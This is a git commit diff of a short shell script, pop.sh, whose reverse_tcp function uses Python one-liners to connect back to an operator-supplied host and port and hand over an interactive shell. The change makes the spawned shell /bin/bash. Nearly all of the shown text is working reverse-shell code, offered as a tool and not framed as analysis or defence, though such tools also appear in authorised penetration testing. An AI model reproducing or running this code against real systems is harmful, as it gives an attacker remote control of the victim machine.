4f7e756d1f78b4d2b850d823f6d999018fa2d478
Mikael Kall <mikael.kall@kindredgroup.com>
2018-07-18 22:36:05 +0200

    Initial commit

--- pop.sh
+++ pop.sh
@@ -9,8 +9,8 @@ LPORT=${LPORT:-"${2}"}
 
 function reverse_tcp()
 {
-    [ -e '/usr/bin/python2' ] && /usr/bin/python2 -c "import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"${LHOST}\", ${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"${SCRIPT_DIR}/pop.sh\");s.close()"
-    [ -e '/usr/bin/python3' ] && /usr/bin/python3 -c "import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"${LHOST}\", ${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"${SCRIPT_DIR}/pop.sh\");s.close()"
+    [ -e '/usr/bin/python2' ] && /usr/bin/python2 -c "import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"${LHOST}\", ${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\");s.close()" && exit
+    [ -e '/usr/bin/python3' ] && /usr/bin/python3 -c "import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"${LHOST}\", ${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\");s.close()" && exit
 }
 
 [ ${#LHOST} != 0 ] && [ ${#LPORT} != 0 ] && reverse_tcp
